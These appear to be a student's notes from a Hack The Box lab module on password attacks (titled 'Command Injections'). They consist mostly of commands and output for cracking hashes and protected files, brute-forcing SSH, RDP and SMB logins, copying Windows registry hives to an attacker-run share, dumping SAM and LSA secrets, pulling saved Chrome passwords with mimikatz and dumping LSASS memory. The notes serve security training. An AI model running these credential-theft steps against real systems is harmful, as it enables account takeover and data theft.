# [HTB] Command Injections
## Introduction to Password Cracking

```
bmdyy@htb:~$ echo -n Soccer06! | md5sum
40291c1d19ee11a7df8495c4cccefdfa  -

bmdyy@htb:~$ echo -n Soccer06! | sha256sum
a025dc6fabb09c2b8bfe23b5944635f9b68433ebd9a1a09453dd4fee00766d93
```

```
mdmithu@htb[/htb]$ echo -n Th1sIsTh3S@lt_Soccer06! | md5sum

90a10ba83c04e7996bc53373170b5474  -
```
#### Dictionary attack
```
[/htb]$ head --lines=20 /usr/share/wordlists/rockyou.txt 

123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
nicole
```
###Introduction to John The Ripper
```
[/htb]$ john --single passwd

Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
```
```
[/htb]$ john --wordlist=<wordlist_file> <hash_file>
```
```
[/htb]$ john --incremental <hash_file>
```
```
[/htb]$ hashid -j 193069ceb0461e1d40d216e32c79c704
```
```
afs	                        john--format=afs [...] <hash_file>	      AFS (Andrew File System) password hashes
bfegg	                      john--format=bfegg [...] <hash_file>	    bfegg hashes used in Eggdrop IRC bots
bf	                        john--format=bf [...] <hash_file>	      Blowfish-based crypt(3) hashes
bsdi	                     john--format=bsdi [...] <hash_file>	    BSDi crypt(3) hashes
crypt(3)	                 john--format=crypt [...] <hash_file>	    Traditional Unix crypt(3) hashes
des	                       john--format=des [...] <hash_file>	      Traditional DES-based crypt(3) hashes
dmd5	                     john--format=dmd5 [...] <hash_file>	    DMD5 (Dragonfly BSD MD5) password hashes
dominosec	                 john--format=dominosec [...] <hash_file>	IBM Lotus Domino 6/7 password hashes
EPiServer SID hashes	     john--format=episerver [...] <hash_file>	EPiServer SID (Security Identifier) password hashes
hdaa	                     john--format=hdaa [...] <hash_file>	    hdaa password hashes used in Openwall GNU/Linux
hmac-md5	                 john--format=hmac-md5 [...] <hash_file>	hmac-md5 password hashes
hmailserver	               john--format=hmailserver [...] <hash_file>	hmailserver password hashes
ipb2	                    john --format=ipb2 [...] <hash_file>     	Invision Power Board 2 password hashes
krb4	                    john --format=krb4 [...] <hash_file>	Kerberos 4 password hashes
krb5	                    john--format=krb5 [...] <hash_file>	Kerberos 5 password hashes
LM	                      john --format=LM [...] <hash_file>	LM (Lan Manager) password hashes
lotus5	                  john --format=lotus5 [...] <hash_file>	Lotus Notes/Domino 5 password hashes
mscash	                  john --format=mscash [...] <hash_file>	MS Cache password hashes
mscash2	                  john --format=mscash2 [...] <hash_file>	MS Cache v2 password hashes
mschapv2	                john --format=mschapv2 [...] <hash_file>	MS CHAP v2 password hashes
mskrb5	                john --format=mskrb5 [...] <hash_file>	MS Kerberos 5 password hashes
mssql05	                john --format=mssql05 [...] <hash_file>	MS SQL 2005 password hashes
mssql	                  john --format=mssql [...] <hash_file>	MS SQL password hashes
mysql-fast	            john --format=mysql-fast [...] <hash_file>	MySQL fast password hashes
mysql	                  john --format=mysql [...] <hash_file>	MySQL password hashes
mysql-sha1	            john --format=mysql-sha1 [...] <hash_file>	MySQL SHA1 password hashes
NETLM	                  john --format=netlm [...] <hash_file>	NETLM (NT LAN Manager) password hashes
NETLMv2	                john --format=netlmv2 [...] <hash_file>	NETLMv2 (NT LAN Manager version 2) password hashes
NETNTLM	                john --format=netntlm [...] <hash_file>	NETNTLM (NT LAN Manager) password hashes
NETNTLMv2	              john --format=netntlmv2 [...] <hash_file>	NETNTLMv2 (NT LAN Manager version 2) password hashes
NEThalfLM	              john --format=nethalflm [...] <hash_file>	NEThalfLM (NT LAN Manager) password hashes
md5ns	                  john --format=md5ns [...] <hash_file>	md5ns (MD5 namespace) password hashes
nsldap	                john --format=nsldap [...] <hash_file>	nsldap (OpenLDAP SHA) password hashes
ssha	                  john --format=ssha [...] <hash_file>	ssha (Salted SHA) password hashes
NT	                    john --format=nt [...] <hash_file>	NT (Windows NT) password hashes
openssha	              john --format=openssha [...] <hash_file>	OPENSSH private key password hashes
oracle11	              john --format=oracle11 [...] <hash_file>	Oracle 11 password hashes
oracle	                john --format=oracle [...] <hash_file>	Oracle password hashes
pdf	                    john --format=pdf [...] <hash_file>	PDF (Portable Document Format) password hashes
phpass-md5	            john --format=phpass-md5 [...] <hash_file>	PHPass-MD5 (Portable PHP password hashing framework) password hashes
phps	                  john --format=phps [...] <hash_file>	PHPS password hashes
pix-md5	                john --format=pix-md5 [...] <hash_file>	Cisco PIX MD5 password hashes
po	                    john --format=po [...] <hash_file>	Po (Sybase SQL Anywhere) password hashes
rar	                    john --format=rar [...] <hash_file>	RAR (WinRAR) password hashes
raw-md4	                john --format=raw-md4 [...] <hash_file>	Raw MD4 password hashes
raw-md5	                john --format=raw-md5 [...] <hash_file>	Raw MD5 password hashes
raw-md5-unicode	        john --format=raw-md5-unicode [...] <hash_file>	Raw MD5 Unicode password hashes
raw-sha1	              john --format=raw-sha1 [...] <hash_file>	Raw SHA1 password hashes
raw-sha224	            john --format=raw-sha224 [...] <hash_file>	Raw SHA224 password hashes
raw-sha256	            john --format=raw-sha256 [...] <hash_file>	Raw SHA256 password hashes
raw-sha384	            john --format=raw-sha384 [...] <hash_file>	Raw SHA384 password hashes
raw-sha512	            john --format=raw-sha512 [...] <hash_file>	Raw SHA512 password hashes
salted-sha	             john --format=salted-sha [...] <hash_file>	Salted SHA password hashes
sapb	                  john --format=sapb [...] <hash_file>	SAP CODVN B (BCODE) password hashes
sapg	                  john --format=sapg [...] <hash_file>	SAP CODVN G (PASSCODE) password hashes
sha1-gen	              john --format=sha1-gen [...] <hash_file>	Generic SHA1 password hashes
skey	                  john --format=skey [...] <hash_file>	S/Key (One-time password) hashes
ssh	                    john --format=ssh [...] <hash_file>	SSH (Secure Shell) password hashes
sybasease	              john --format=sybasease [...] <hash_file>	Sybase ASE password hashes
xsha	                  john --format=xsha [...] <hash_file>	xsha (Extended SHA) password hashes
zip	                     john --format=zip [...] <hash_file>	ZIP (WinZip) password hashes
```
### Cracking files
```
[/htb]$ <tool> <file_to_crack> > file.hash
```
```
Tool	                      Description
pdf2john	                  Converts PDF documents for John
ssh2john	                  Converts SSH private keys for John
mscash2john	                Converts MS Cash hashes for John
keychain2john	              Converts OS X keychain files for John
rar2john	                  Converts RAR archives for John
pfx2john	                  Converts PKCS#12 files for John
truecrypt_volume2john	      Converts TrueCrypt volumes for John
keepass2john	              Converts KeePass databases for John
vncpcap2john	              Converts VNC PCAP files for John
putty2john	                Converts PuTTY private keys for John
zip2john	                  Converts ZIP archives for John
hccap2john	                Converts WPA/WPA2 handshake captures for John
office2john	                Converts MS Office documents for John
wpa2john	                  Converts WPA/WPA2 handshakes for John
```
```
/htb]$ locate *2john*
```
####Introduction to Hashcat
```
[/htb]$ hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
```
```
[/htb]$ hashcat --help

...SNIP...

- [ Hash modes ] -

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
    100 | SHA1                                                       | Raw Hash
   1300 | SHA2-224                                                   | Raw Hash
   1400 | SHA2-256                                                   | Raw Hash
  10800 | SHA2-384                                                   | Raw Hash
   1700 | SHA2-512
```
```
[/htb]$ hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'

Analyzing '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
[+] MD5 Crypt [Hashcat Mode: 500]
[+] Cisco-IOS(MD5) [Hashcat Mode: 500]
[+] FreeBSD MD5 [Hashcat Mode: 500]
```
####Dictionary attack
```
[/htb]$ hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt

...SNIP...               

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: e3e3ec5831ad5e7288241960e5d4fdb8
Time.Started.....: Sat Apr 19 08:58:44 2025 (0 secs)
Time.Estimated...: Sat Apr 19 08:58:44 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1706.6 kH/s (0.14ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 28672/14344385 (0.20%)
```
```
[/htb]$ ls -l /usr/share/hashcat/rules

total 2852
-rw-r--r-- 1 root root 309439 Apr 24  2024 Incisive-leetspeak.rule
-rw-r--r-- 1 root root  35802 Apr 24  2024 InsidePro-HashManager.rule
-rw-r--r-- 1 root root  20580 Apr 24  2024 InsidePro-PasswordsPro.rule
-rw-r--r-- 1 root root  64068 Apr 24  2024 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
-rw-r--r-- 1 root root   2027 Apr 24  2024 T0XlC-insert_space_and_special_0_F.rule
-rw-r--r-- 1 root root  34437 Apr 24  2024 T0XlC-insert_top_100_passwords_1_G.rule
-rw-r--r-- 1 root root  34813 Apr 24  2024 T0XlC.rule
-rw-r--r-- 1 root root   1289 Apr 24  2024 T0XlC_3_rule.rule
```
```
[/htb]$ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

...SNIP...

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1b0556a75770563578569ae21392630c
Time.Started.....: Sat Apr 19 09:16:35 2025 (0 secs)
Time.Estimated...: Sat Apr 19 09:16:35 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/us
```
```
[/htb]$ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'

...SNIP...

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1e293d6912d074c0fd15844d803400dd
Time.Started.....: Sat Apr 19 09:43:02 2025 (4 secs)
Time.Estimated...: Sat Apr 19 09:43:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
```
#### Writing Custom Wordlists and Rules
```
[/htb]$ cat password.list

password
```
```
Function	            Description
:	                  Do nothing
l	                  Lowercase all letters
u	                  Uppercase all letters
c	                  Capitalize the first letter and lowercase others
sXY	                  Replace all instances of X with Y
$!	                  Add the exclamation character at the end
```
```
[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```
##### Writing Custom Wordlists and Rules
```
[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```
```
[/htb]$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```
##### Generating wordlists using CeWL
```
[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
[/htb]$ wc -l inlane.wordlist
326
```

#### Cracking Protected Files
##### Hunting for Encrypted Files
```
[/htb]$ for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .xls

File extension:  .xls*

File extension:  .xltx

File extension:  .od*
/home/cry0l1t3/Docs/document-temp.odt
/home/cry0l1t3/Docs/product-improvements.odp
/home/cry0l1t3/Docs/mgmt-spreadsheet.ods
...SNIP...
```
##### Hunting for SSH keys
```
[/htb]$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

/home/jsmith/.ssh/id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/jsmith/.ssh/SSH.private:1:-----BEGIN RSA PRIVATE KEY-----
/home/jsmith/Documents/id_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
```
```
[/htb]$ cat /home/jsmith/.ssh/SSH.private

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC

8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
<SNIP>
```
```
[/htb]$ ssh-keygen -yf ~/.ssh/id_ed25519 

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpNefJd834VkD5iq+22Zh59Gzmmtzo6rAffCx2UtaS6
```
```
[/htb]$ ssh-keygen -yf ~/.ssh/id_rsa

Enter passphrase for "/home/jsmith/.ssh/id_rsa":
```
##### Cracking encrypted SSH keys
```
[/htb]$ locate *2john*

/usr/bin/bitlocker2john
/usr/bin/dmg2john
/usr/bin/gpg2john
/usr/bin/hccap2john
/usr/bin/keepass2john
/usr/bin/putty2john
/usr/bin/racf2john
/usr/bin/rar2john
/usr/bin/uaf2john
/usr/bin/vncpcap2john
/usr/bin/wlanhcx2john
/usr/bin/wpapcap2john
/usr/bin/zip2john
/usr/share/john/1password2john.py
/usr/share/john/7z2john.pl
/usr/share/john/DPAPImk2john.py
/usr/share/john/adxcsouf2john.py
/usr/share/john/aem2john.py
/usr/share/john/aix2john.pl
/usr/share/john/aix2john.py
/usr/share/john/andotp2john.py
/usr/share/john/androidbackup2john.py
<SNIP>
```
```
[/htb]$ ssh2john.py SSH.private > ssh.hash
[/htb]$ john --wordlist=rockyou.txt ssh.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
1234         (SSH.private)
1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying
Session completed
```
```
[/htb]$ john ssh.hash --show

SSH.private:1234

1 password hash cracked, 0 left
```
```
[/htb]$ office2john.py Protected.docx > protected-docx.hash
[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
[/htb]$ john protected-docx.hash --show

Protected.docx:1234

1 password hash cracked, 0 left
```
```
[/htb]$ pdf2john.py PDF.pdf > pdf.hash
[/htb]$ john --wordlist=rockyou.txt pdf.hash
[/htb]$ john pdf.hash --show

PDF.pdf:1234

1 password hash cracked, 0 left
```
#### Cracking Protected Archives
```
[/htb]$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt

.mint
.zhelp
.b6z
.fzpz
.zst
.apz
.ufs.uzip
.vrpackage
.sfg
.gzip
.xapk
.rar
.pkg.tar.xz
<SNIP>
```
##### Cracking ZIP files
```
[/htb]$ zip2john ZIP.zip > zip.hash
mdmithu@htb[/htb]$ cat zip.hash 

ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
```
```
[/htb]$ john --wordlist=rockyou.txt zip.hash

[/htb]$ john zip.hash --show

ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip

1 password hash cracked, 0 left
```
##### Cracking OpenSSL encrypted GZIP files
```
[/htb]$ file GZIP.gzip 

GZIP.gzip: openssl enc'd data with salted password
```
```
[/htb]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now
<SNIP>
```

```
[/htb]$ ls

customers.csv  GZIP.gzip  rockyou.txt
```
#### Cracking BitLocker-encrypted drives
```
[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
[/htb]$ cat backup.hash

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f
```
```
[/htb]$ hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt

<SNIP>

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22100 (BitLocker)
Hash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f
Time.Started.....: Sat Apr 19 17:49:25 2025 (1 min, 56 secs)
Time.Estimated...: Sat Apr 19 17:51:21 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       25 H/s (9.28ms) @ Accel:64 Loops:4096 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2880/14344385 
```
###Mounting BitLocker-encrypted drives in Windows
```
[/htb]$ sudo apt-get install dislocker
```
```
b[/htb]$ sudo mkdir -p /media/bitlocker
[/htb]$ sudo mkdir -p /media/bitlockermount
```
```
[/htb]$ sudo losetup -f -P Backup.vhd
[/htb]$ sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
[/htb]$ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

```
[/htb]$ cd /media/bitlockermount/
[/htb]$ ls -la
```
```
[/htb]$ sudo umount /media/bitlockermount
[/htb]$ sudo umount /media/bitlocker
```
### Network Services

```
[/htb]$ sudo apt-get -y install netexec
```

```
[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```
[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list

```

```
[/htb]$ sudo gem install evil-winrm
Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1
```

```
[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```
[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
```

```
[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
```

```
[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
```
```
[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
```

```
[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
```
```
[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
```
```
[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```
[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
```
```
[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
```

#### Spraying, Stuffing, and Defaults

```
[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```
```
[/htb]$ hydra -C user_pass.list ssh://10.100.38.23
```

```
[/htb]$ pip3 install defaultcreds-cheat-sheet
```
```
[/htb]$ creds search linksys

+---------------+---------------+------------+
| Product       |    username   |  password  |
+---------------+---------------+------------+
| linksys       |    <blank>    |  <blank>   |
| linksys       |    <blank>    |   admin    |
| linksys       |    <blank>    | epicrouter |
| linksys       | Administrator |   admin    |
| linksys       |     admin     |  <blank>   |
| linksys       |     admin     |   admin    |
| linksys       |    comcast    |    1234    |
| linksys       |      root     |  orion99   |
| linksys       |      user     |  tivonpw   |
| linksys (ssh) |     admin     |   admin    |
| linksys (ssh) |     admin     |  password  |
| linksys (ssh) |    linksys    |  <blank>   |
| linksys (ssh) |      root     |   admin    |
+---------------+---------------+------------+
```

### Attacking SAM, SYSTEM, and SECURITY

```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```
```
b[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
#### Moving hive copies to share

```
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```
```
b[/htb]$ ls

sam.save  security.save  system.save
```

#### Dumping hashes with secretsdump

```
[/htb]$ locate secretsdump 
```
```
[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eea
```
```
[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385
```
```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```
```
[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

<SNIP>

$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 
```

### DPAPI
```
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```
```
[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b254
```
```
[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:a
```

#### Attacking LSASS

```
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```
```
  Attacking LSASS
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```
```
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
